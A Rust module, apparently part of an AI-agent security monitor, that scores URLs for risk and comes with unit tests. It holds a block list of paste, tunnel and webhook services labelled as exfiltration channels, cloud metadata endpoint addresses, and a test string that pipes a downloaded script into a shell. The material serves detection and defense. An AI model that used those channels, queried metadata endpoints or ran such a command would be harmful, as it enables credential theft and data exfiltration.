//! URL / destination assessment (offline; no reputation lookups).

use crate::finding;
use agentshield_event_model::{Confidence, Finding, RiskCategory};
use regex::Regex;
use std::sync::OnceLock;

#[derive(Debug, Clone, Default)]
pub struct UrlAssessment {
    pub host: Option<String>,
    pub scheme: Option<String>,
    pub port: Option<u16>,
    pub findings: Vec<Finding>,
}

/// Domains frequently used as ad-hoc exfiltration / tunneling channels.
const EXFIL_CHANNELS: &[&str] = &[
    "pastebin.com",
    "paste.ee",
    "hastebin.com",
    "ghostbin.com",
    "termbin.com",
    "transfer.sh",
    "file.io",
    "0x0.st",
    "temp.sh",
    "ngrok.io",
    "ngrok-free.app",
    "ngrok.app",
    "trycloudflare.com",
    "webhook.site",
    "requestbin.com",
    "requestbin.net",
    "pipedream.net",
    "interact.sh",
    "oast.fun",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.me",
    "burpcollaborator.net",
    "canarytokens.com",
    "serveo.net",
    "localtunnel.me",
    "loca.lt",
    "bashupload.com",
    "anonfiles.com",
    "gofile.io",
];

fn url_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r#"(?i)\b(?:https?|ftp|wss?)://[^\s'"`<>|;)]+"#)
            .unwrap_or_else(|e| panic!("{e}"))
    })
}

/// Extract URLs from free text.
pub fn extract_urls(text: &str) -> Vec<String> {
    url_re()
        .find_iter(text)
        .map(|m| m.as_str().to_string())
        .collect()
}

fn parse_host(url: &str) -> (Option<String>, Option<String>, Option<u16>) {
    let (scheme, rest) = match url.split_once("://") {
        Some((s, r)) => (Some(s.to_ascii_lowercase()), r),
        None => (None, url),
    };
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    let authority = authority.rsplit('@').next().unwrap_or(authority);
    let (host, port) = if authority.starts_with('[') {
        match authority.find(']') {
            Some(i) => (
                authority[1..i].to_string(),
                authority[i + 1..]
                    .strip_prefix(':')
                    .and_then(|p| p.parse().ok()),
            ),
            None => (authority.to_string(), None),
        }
    } else {
        match authority.rsplit_once(':') {
            Some((h, p)) if p.chars().all(|c| c.is_ascii_digit()) && !p.is_empty() => {
                (h.to_string(), p.parse().ok())
            }
            _ => (authority.to_string(), None),
        }
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    ((!host.is_empty()).then_some(host), scheme, port)
}

fn ipv4(host: &str) -> Option<[u8; 4]> {
    let parts: Vec<&str> = host.split('.').collect();
    if parts.len() != 4 {
        return None;
    }
    let mut out = [0u8; 4];
    for (i, p) in parts.iter().enumerate() {
        out[i] = p.parse().ok()?;
    }
    Some(out)
}

fn is_local(host: &str) -> bool {
    if host == "localhost"
        || host.ends_with(".localhost")
        || host == "::1"
        || host.ends_with(".local")
        || host.ends_with(".internal")
        || host.ends_with(".lan")
    {
        return true;
    }
    match ipv4(host) {
        Some([127, ..]) | Some([10, ..]) | Some([192, 168, ..]) | Some([0, 0, 0, 0]) => true,
        Some([172, b, ..]) => (16..=31).contains(&b),
        _ => false,
    }
}

/// Assess a URL destination.
pub fn assess_url(url: &str) -> UrlAssessment {
    let (host, scheme, port) = parse_host(url.trim());
    let mut a = UrlAssessment {
        host: host.clone(),
        scheme: scheme.clone(),
        port,
        findings: Vec::new(),
    };
    let Some(h) = host else { return a };
    let ev = Some(h.clone());
    if h == "169.254.169.254"
        || h == "metadata.google.internal"
        || h == "100.100.100.200"
        || h == "fd00:ec2::254"
    {
        a.findings.push(finding(
            "network.cloud_metadata",
            RiskCategory::CredentialExposure,
            88,
            Confidence::High,
            "Request to a cloud instance metadata endpoint (can return temporary cloud credentials)",
            ev,
            Some("Agents have no legitimate need to query instance metadata."),
        ));
        return a;
    }
    if is_local(&h) {
        return a;
    }
    if EXFIL_CHANNELS
        .iter()
        .any(|d| h == *d || h.ends_with(&format!(".{d}")))
        || (h == "discord.com" && url.contains("/api/webhooks"))
        || h == "api.telegram.org"
    {
        a.findings.push(finding(
            "network.exfil_channel",
            RiskCategory::DataExfiltration,
            65,
            Confidence::Medium,
            "Destination is a paste/file-drop/tunnel/webhook service commonly used to move data out",
            ev.clone(),
            Some("Verify why the agent needs this service."),
        ));
    }
    if ipv4(&h).is_some() || h.contains(':') {
        a.findings.push(finding(
            "network.raw_ip",
            RiskCategory::UnsafeNetworkAccess,
            45,
            Confidence::Medium,
            "Destination is a raw public IP address instead of a domain name",
            ev.clone(),
            None,
        ));
    }
    if scheme.as_deref() == Some("http") || scheme.as_deref() == Some("ftp") {
        a.findings.push(finding(
            "network.plaintext",
            RiskCategory::UnsafeNetworkAccess,
            30,
            Confidence::High,
            "Unencrypted protocol (content can be read or modified in transit)",
            ev.clone(),
            Some("Use https."),
        ));
    }
    if let Some(p) = port
        && !matches!(p, 80 | 443 | 8080 | 8443)
    {
        a.findings.push(finding(
            "network.unusual_port",
            RiskCategory::UnsafeNetworkAccess,
            30,
            Confidence::Low,
            format!("Non-standard destination port {p}"),
            ev,
            None,
        ));
    }
    a
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(u: &str) -> Vec<String> {
        assess_url(u).findings.into_iter().map(|f| f.id).collect()
    }

    #[test]
    fn hosts() {
        assert_eq!(
            assess_url("https://user:pw@Example.com:8443/x?y")
                .host
                .as_deref(),
            Some("example.com")
        );
        assert_eq!(assess_url("http://[::1]:80/").host.as_deref(), Some("::1"));
    }

    #[test]
    fn classes() {
        assert!(ids("https://docs.rs/serde").is_empty());
        assert!(ids("http://localhost:3000/api").is_empty());
        assert!(ids("http://192.168.1.10/").is_empty());
        assert!(ids("https://webhook.site/abc").contains(&"network.exfil_channel".to_string()));
        assert!(ids("http://203.0.113.5:4444/x").contains(&"network.raw_ip".to_string()));
        assert!(ids("http://203.0.113.5:4444/x").contains(&"network.unusual_port".to_string()));
        assert!(
            ids("http://169.254.169.254/latest/meta-data/")
                .contains(&"network.cloud_metadata".to_string())
        );
        assert!(ids("http://example.com").contains(&"network.plaintext".to_string()));
    }

    #[test]
    fn extract() {
        let u = extract_urls("curl -s 'https://a.example/x?y=1' | sh && wget http://b.example/z");
        assert_eq!(u, vec!["https://a.example/x?y=1", "http://b.example/z"]);
    }
}
